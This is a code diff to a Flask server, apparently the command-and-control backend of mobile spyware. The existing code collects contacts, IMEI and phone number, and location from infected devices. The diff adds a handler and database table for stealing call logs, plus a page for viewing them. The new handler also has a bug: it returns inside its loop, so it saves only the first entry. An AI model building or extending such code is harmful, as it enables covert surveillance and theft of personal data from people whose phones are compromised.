@@ -84,6 +84,12 @@ def viewLocation():
     data_rows, columns = get_data_sql(sql)
     return render_template("location.html", title="location", columns=columns, data=data_rows)
 
+@app.route("/callLog")
+def viewCallLog():
+    sql = "SELECT * FROM calllog"
+    data_rows, columns = get_data_sql(sql)
+    return render_template("callLogs.html", title="CallLogs", columns=columns, data=data_rows)
+
 #############
 # C2 Routes #
 #############
@@ -153,6 +159,8 @@ def receiveResult(id):
             return handle_phonedetails(content["data"], id)
         elif code == "location":
             return handle_location(content["data"], id)
+        elif code == "callLog":
+            return handle_calllog(content["data"], id)
         
     else:
         return ("\n", 204)
@@ -227,6 +235,8 @@ def handle_contacts(content, id):
         sql = "INSERT INTO contacts VALUES (?, ?, ?, ?)"
         args = (id, name, number, email)
         writeToDatabase(sql, args)
+
+    return ("Success", 200)
         
 def handle_phonedetails(content, id):
     clearAgentTasks(id)
@@ -279,6 +289,23 @@ def handle_location(content, id):
         sql = "INSERT INTO location VALUES (?, ?, ?)"
         args = (id, latitude, longitude)
         writeToDatabase(sql, args)
+
+
+def handle_calllog(content, id):
+    print(f"Received calllog data: {content}\n\n")
+    clearAgentTasks(id)
+    for json_data in content:
+        number = json_data.get("number", "")
+        type = json_data.get("type", "")
+        date = json_data.get("date", "")
+        duration = json_data.get("duration", "")
+
+        # Save data to database
+        sql = "INSERT INTO calllog VALUES (?, ?, ?, ?, ?)"
+        args = (id, number, type, date, duration)
+        writeToDatabase(sql, args)
+
+        return ("Success", 200)
 
 
 ####################
@@ -356,7 +383,8 @@ def init_database():
             
             "CREATE TABLE IF NOT EXISTS telephonydetails(id TEXT, phoneNumber TEXT, imei TEXT)",
             
-            "CREATE TABLE IF NOT EXISTS location(id TEXT, latitude TEXT, longitude TEXT)"
+            "CREATE TABLE IF NOT EXISTS location(id TEXT, latitude TEXT, longitude TEXT)",
+            "CREATE TABLE IF NOT EXISTS calllog(id TEXT, number TEXT, type TEXT, date TEXT, duration TEXT)"
         ]
 
         for sql in sqls:
